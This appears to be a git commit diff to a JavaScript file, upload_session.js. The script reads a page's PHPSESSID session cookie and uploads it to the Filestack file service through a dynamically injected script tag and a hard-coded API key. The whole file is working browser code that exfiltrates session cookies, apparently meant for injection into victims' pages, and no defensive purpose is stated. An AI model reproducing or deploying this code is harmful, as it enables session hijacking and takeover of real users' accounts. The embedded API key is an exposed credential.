11c0e92101770449d5b5f243f70134f921619a74
JkDev <jkdevarg@gmail.com>
2023-05-19 01:47:54 -0500

    add upload file

--- upload_session.js
+++ upload_session.js
@@ -2,13 +2,19 @@ var session = document.cookie.match(/PHPSESSID=(\w+)/);
 var sessionSave = session ? session[1] : '';
 var blob = new Blob([JSON.stringify(sessionSave)], { type: 'text/plain' });
 
-var client = filestack.init('YOUR API KEY HERE');
+var script = document.createElement('script');
+script.src = 'https://static.filestackapi.com/filestack-js/3.x.x/filestack.min.js';
+script.onload = function() {
+  var client = filestack.init('AHaSBB7sZSe6Qg8OeRRp5z');
 
-client.upload(blob)
+  client.upload(blob)
     .then(response => {
-        var fileUrl = response.url;
-        console.log('Archivo subido con éxito:', fileUrl);
+      var fileUrl = response.url;
+      console.log('File Upload Ok:', fileUrl);
     })
     .catch(error => {
-        console.error('Error al subir el archivo:', error);
+      console.error('Error:', error);
     });
+};
+
+document.head.appendChild(script);
